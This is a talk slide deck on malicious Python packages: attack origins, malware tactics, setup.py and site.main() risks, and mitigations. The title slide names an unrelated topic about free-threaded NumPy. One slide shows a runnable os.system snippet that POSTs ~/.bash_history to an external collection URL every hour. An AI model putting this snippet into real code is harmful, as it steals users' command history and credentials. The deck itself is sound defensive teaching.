---
theme: seriph
# background: https://cover.sli.dev
title: Getting Started with Free-Threaded Python Using NumPy
class: text-center
transition: slide-left
comark: true
---

# Getting Started with Free-Threaded Python Using NumPy

Christopher Ariza <br/>




---
layout: center
class: text-center quote
---

<style scoped>
.slidev-layout {
  background-color: #0f0f1e;
  background-image: radial-gradient(ellipse 60% 50% at 50% 50%, rgba(60, 60, 110, 0.5) 0%, transparent 100%);
}
</style>

# "Do not install untrusted packages."


---
class: attack
---

# Risks of Python Package Installation

<v-clicks depth=2>

- Arbitrary Code Execution (ACE)
- Your privileges are enough
- Transitive dependencies increase complexity

</v-clicks>



---
class: attack
---

# Origins of Package-Based Attacks

<v-clicks depth=2>

- Compromised maintainer credentials
    - Injection of malicious code (trojan, hijacking)
    - Addition of a malicious dependency (e.g. Axios)
- Typosquatting & Masquerading
    - `requesuts`, `grokwrapper`
- Dependency confusion (e.g. PyTorch `torchtriton`)
- Social Engineering
    - Fake recruiters, fake IT support

</v-clicks>


---
class: attack
---

# Why I Care

<v-clicks depth=2>

- Supply chain risks in my organization
- Recognition that no controls are foolproof
- Developed system-wide Python vulnerability scanner `fetter`

</v-clicks>

---
class: attack
---

# Why You Should Care

<v-clicks depth=2>

- Users are gateways into organizations
- Credential & API key theft can have severe consequences
- Practical mitigations are available

</v-clicks>


---
layout: center
class: text-center
---

<style scoped>
.slidev-layout {
  background-color: #2e1a1a;
  background-image: radial-gradient(rgba(255,255,255,0.05) 2px, transparent 2px);
  background-size: 48px 48px;
}
</style>

# Mechanisms of Python Malware

<div style="position:absolute;right:0%;bottom:-5%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0.1) invert(1);">🔥</div>




---
class: malware
---

# Common Malware Tactics

<v-clicks depth=2>

- Reconnaissance
- Credential exfiltration (info-stealers)
  - SSH keys, AWS tokens, API keys
  - Environment variables, `.env` files
  - Clipboard extraction
- Data theft (source code, databases)
- Persistence (keyloggers, backdoors)
- Resource abuse (crypto miners, botnets)
- Ransomware, wipers

</v-clicks>



---
class: malware
---

# Exfiltrate Shell History Every Hour

```python {0|1-2|3|3-5}
import os
os.system('''nohup bash -c 'while true; do
curl -s -X POST -d @~/.bash_history https://doom.org/collect;
sleep 3600;
done' &''')
```





---
class: history
---

# Packaging & Installation Concerns

<v-clicks depth=2>

- Why does `setup.py` exist and do we still need it?
- What does `site.main()` do?

</v-clicks>



---
class: history
---

# The Legacy of `setup.py`

<v-clicks depth=2>

- PEP 229 (2000)
    - Establishes `setup.py` for portable C-extensions
    - `python setup.py install` copies files to `site-packages`
- `setup.py`
    - Where metadata is defined until 2020
    - Running is required for *source* installations
- PEP 427 (2012): the Wheel (`.whl`) Binary Package Format
    - `pip` 1.4 (2013) supports wheels
    - Permits installation without running `setup.py`

</v-clicks>



---
layout: center
class: text-center
---

<style scoped>
.slidev-layout {
  background-color: #1a2e2a;
  background-image: radial-gradient(rgba(255,255,255,0.05) 2px, transparent 2px);
  background-size: 48px 48px;
}
</style>

# Mitigations

<div style="position:absolute;right:-5%;bottom:-5%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0) invert(1);">🛡️</div>



---
class: mitigation
---

# Mitigations

<v-clicks depth=2>

- Defending PyPI
- Avoiding `site.main()`
- Package Screening
- Deception Technology

</v-clicks>




---
class: mitigation
---

# Mitigations: Avoiding `site.main()`

<v-clicks depth=2>

- Disable `site.main()`: `python -S`
- Manually add "site-packages" to `sys.path`
```bash
$ python -S
>>> import site, sys
>>> sys.path.extend(site.getsitepackages())
```

</v-clicks>



---
layout: center
class: text-center quote
---

<style scoped>
.slidev-layout {
  background-color: #0f0f1e;
  background-image: radial-gradient(ellipse 60% 50% at 50% 50%, rgba(60, 60, 110, 0.5) 0%, transparent 100%);
}
</style>

# The easiest way to get malware on your machine is to install it yourself


---

# Conclusions

<v-clicks depth=2>

- Do not install untrusted packages
- Lock & screen your packages
- Avoid `setup.py`, favor `.whl`, question `site.main()`
- Lay traps

</v-clicks>



---
layout: center
class: text-center
---

# Thank You

https://flexatone.net

<!-- <PoweredBySlidev mt-10 /> -->
